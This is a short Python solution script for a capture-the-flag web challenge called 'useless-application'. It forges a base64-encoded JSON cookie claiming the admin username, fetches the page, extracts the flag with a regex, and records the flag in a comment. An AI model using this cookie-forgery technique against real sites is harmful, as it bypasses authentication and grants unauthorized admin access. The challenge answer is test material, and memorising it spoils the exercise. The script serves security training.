import requests
import re

site = "https://useless-application.challs.olicyber.it/"

cookie = {"user" : "ewoKICAidXNlcm5hbWUiOiAiYWRtaW4iCgp9"} #username : admin

r = requests.get(site, cookies=cookie).text

match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{n3v3r_7rus7_us3r_1npu7}